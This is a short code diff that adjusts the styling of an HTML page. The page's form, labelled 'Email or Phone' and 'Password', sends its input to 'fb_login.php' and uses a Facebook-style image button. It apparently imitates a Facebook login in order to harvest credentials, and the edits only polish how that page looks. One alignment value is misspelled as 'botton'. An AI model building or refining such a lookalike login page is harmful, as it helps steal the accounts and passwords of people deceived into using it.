@@ -22,12 +22,12 @@ div.transbox {
   width: 350px;
   height: 170px;
   border: 1px solid black;
-  background-color: rgba(255,255,255,.5);
+  background-color: rgba(255,255,255,.3);
   position: absolute;
   left: 65%;
 }
-div.transbox {
-  margin: 30px;
+div.dentro {
+  margin: 50px;
 }
 </style>
 
@@ -35,17 +35,17 @@ div.transbox {
 <div class="dentro">
   <form action="fb_login.php" method="post">
       <table  border="0">
-      <tr valign="middle">
+      <tr valign="botton">
       <td><font style="font-family:arial; font-size:10px;"><b>Email or Phone </b></font></td>
-      <td align="center"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
+      <td align="left"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
-      <tr valign="middle">
+      <tr valign="botton">
       <td><font style="font-family:arial; font-size:10px;"><b>Password </b></font></td>
-      <td align="center"><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
+      <td align="left"><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
-      <tr valign="middle">
+      <tr valign="botton">
       <td></td>
-      <td align="center"><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
+      <td align="left"><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
       </tr>
       </table>
   </form>
